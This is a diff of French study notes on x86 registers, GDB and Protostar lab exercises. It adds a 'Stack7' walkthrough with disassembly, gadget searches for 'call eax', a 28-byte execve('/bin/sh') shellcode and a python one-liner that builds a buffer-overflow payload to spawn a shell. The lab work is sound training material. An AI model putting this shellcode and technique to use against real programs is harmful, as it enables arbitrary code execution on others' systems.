@@ -3,10 +3,18 @@
 * [EIP](http://www.c-jump.com/CIS77/ASM/Instructions/I77_0040_instruction_pointer.htm): Instruction Pointer Register 
 * [ESP](http://www.c-jump.com/CIS77/ASM/Stack/S77_0040_esp_register.htm): The ESP register serves as an indirect memory operand pointing to the top of the stack at any time.
 * EBP: ebp is/was for a stack frame so that when you entered a function ebp could get a copy of esp at that point, everything on the stack before that happens, return address, passed in parameters, etc and things that are global for that function (local variables) will now be a static distance away from the stack frame pointer for the duration of the function. esp is now free to wander about as the compiler desires and can be used when nesting to other functions (each needs to preserve the ebp naturally). 
+* [EAX](https://fr.wikibooks.org/wiki/Programmation_Assembleur/x86/Registres): Utilisé pour les opérations arithmétiques et le stockage de la valeur de retour des appels systèmes.
 
 # Memo GDB
 
+Commands:
+
 * [https://cs.brown.edu/courses/cs033/docs/guides/gdb.pdf](https://cs.brown.edu/courses/cs033/docs/guides/gdb.pdf)
+
+Outils:
+
+* [Peda](https://github.com/longld/peda)
+
 
 
 Lancer `gdb`:
@@ -300,11 +308,8 @@ Du coup:
 	FileFormat: Elf, Arch: Ia32
 	0x0011f3bf: /bin/sh
 
-
-
 Donc, on connaît l'adresse de la chaîne "`/bin/sh`" relativement au debut de la `libc`: `0x0011f3bf`.
 Il faut ajouter l'adresse de chargement de la librairie.
-
 
 	0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so
 
@@ -320,7 +325,107 @@ D'où:
 	ls /
 	bin   dev  home        lib   lost+found  mnt  proc  selinux  sys  usr  vmlinuz
 	boot  etc  initrd.img  live  media	 opt  sbin  srv      tmp  var
-	
 
 
+# Stack7
+
+## Présentation
+
+[](https://web.archive.org/web/20140405141221/http://exploit-exercises.com/protostar/stack7)
+
+## Exploitation
+
+	(gdb) disassemble main
+	Dump of assembler code for function main:
+	0x08048545 <main+0>:	push   ebp
+	0x08048546 <main+1>:	mov    ebp,esp
+	0x08048548 <main+3>:	and    esp,0xfffffff0
+	0x0804854b <main+6>:	call   0x80484c4 <getpath>
+	0x08048550 <main+11>:	mov    esp,ebp
+	0x08048552 <main+13>:	pop    ebp
+	0x08048553 <main+14>:	ret    
+	End of assembler dump.
+	(gdb) disassemble getpath
+	Dump of assembler code for function getpath:
+	0x080484c4 <getpath+0>:	push   ebp
+	0x080484c5 <getpath+1>:	mov    ebp,esp
+	0x080484c7 <getpath+3>:	sub    esp,0x68
+	0x080484ca <getpath+6>:	mov    eax,0x8048620
+	0x080484cf <getpath+11>:	mov    DWORD PTR [esp],eax
+	0x080484d2 <getpath+14>:	call   0x80483e4 <printf@plt>
+	0x080484d7 <getpath+19>:	mov    eax,ds:0x8049780
+	0x080484dc <getpath+24>:	mov    DWORD PTR [esp],eax
+	0x080484df <getpath+27>:	call   0x80483d4 <fflush@plt>
+	0x080484e4 <getpath+32>:	lea    eax,[ebp-0x4c]
+	0x080484e7 <getpath+35>:	mov    DWORD PTR [esp],eax
+	0x080484ea <getpath+38>:	call   0x80483a4 <gets@plt>
+	0x080484ef <getpath+43>:	mov    eax,DWORD PTR [ebp+0x4]
+	0x080484f2 <getpath+46>:	mov    DWORD PTR [ebp-0xc],eax
+	0x080484f5 <getpath+49>:	mov    eax,DWORD PTR [ebp-0xc]
+	0x080484f8 <getpath+52>:	and    eax,0xb0000000
+	0x080484fd <getpath+57>:	cmp    eax,0xb0000000
+	0x08048502 <getpath+62>:	jne    0x8048524 <getpath+96>
+	0x08048504 <getpath+64>:	mov    eax,0x8048634
+	0x08048509 <getpath+69>:	mov    edx,DWORD PTR [ebp-0xc]
+	0x0804850c <getpath+72>:	mov    DWORD PTR [esp+0x4],edx
+	0x08048510 <getpath+76>:	mov    DWORD PTR [esp],eax
+	0x08048513 <getpath+79>:	call   0x80483e4 <printf@plt>
+	0x08048518 <getpath+84>:	mov    DWORD PTR [esp],0x1
+	0x0804851f <getpath+91>:	call   0x80483c4 <_exit@plt>
+	0x08048524 <getpath+96>:	mov    eax,0x8048640
+	0x08048529 <getpath+101>:	lea    edx,[ebp-0x4c]
+	0x0804852c <getpath+104>:	mov    DWORD PTR [esp+0x4],edx
+	0x08048530 <getpath+108>:	mov    DWORD PTR [esp],eax
+	0x08048533 <getpath+111>:	call   0x80483e4 <printf@plt>
+	0x08048538 <getpath+116>:	lea    eax,[ebp-0x4c]
+	0x0804853b <getpath+119>:	mov    DWORD PTR [esp],eax
+	0x0804853e <getpath+122>:	call   0x80483f4 <strdup@plt>
+	0x08048543 <getpath+127>:	leave  
+	0x08048544 <getpath+128>:	ret    
+	End of assembler dump.
+
+Il faut utiliser `rp-lin-x86`. Par exemple:
+
+	user@protostar:/opt/protostar/bin$ ./rp-lin-x86 --search-hexa="/bin/sh" --file /lib/libc-2.11.2.so
+	Trying to open '/lib/libc-2.11.2.so'..
+	Loading ELF information..
+	FileFormat: Elf, Arch: Ia32
+	0x0011f3bf: /bin/sh
+
+Le commande `strdup(buffer)` retourne une valeur **stockée dans [EAX](https://fr.wikibooks.org/wiki/Programmation_Assembleur/x86/Registres)**.
+Conséquence: nous avons un moyen d'injecter du code arbitraire dans le processus.
+
+On place un breakpoint à la fin de la fonction `getpath()`:
+
+	b *0x08048544
+	r
+
+On trouve l'adresse de retour de `getpath()`.
+
+On cherche un `call eax` dans le programme `stack7`:
+
+	user@protostar:/opt/protostar/bin$ ./rp-lin-x86 --file stack7 -r 2 | egrep ':[^,]+call'
+	0x08048478: call dword [0x0804965C+eax*4] ;  (1 found)
+	0x080485b4: call dword [ebx+esi*4-0x000000E8] ;  (1 found)
+	0x080484bf: call eax ;  (1 found)
+	0x080485eb: call eax ;  (1 found)
+
+Donc, nous avons:
+
+* l'adresse d'une instruction `call eax` (ex: `0x080485eb`).
+* un moyen d'injecter une adresse dans EAX via `strdup()` (retour de la fonction stockée dans `EAX`).
+
+Nombre d'octets pour écraser l'adresse de retour: 0x50.
+
+Sur [ce site](http://shell-storm.org/shellcode/files/shellcode-811.php)
+, on trouve un exploit:
+
+	"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
+
+On forge une suite d'octets arbitaire:
+
+	python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * (0x50 - 28) + "\xBF\x84\x04\x08"' > /tmp/file && ls -l /tmp/file
+
+> * `(0x50 - 28)` car il faut injecter 0x50 carcatères.
+> * On fait une pierre deux coups. L'appel à `call EAX` est injecté via écrasement causé par un débordement de buffer `buffer` (`0x50` caractères).
 
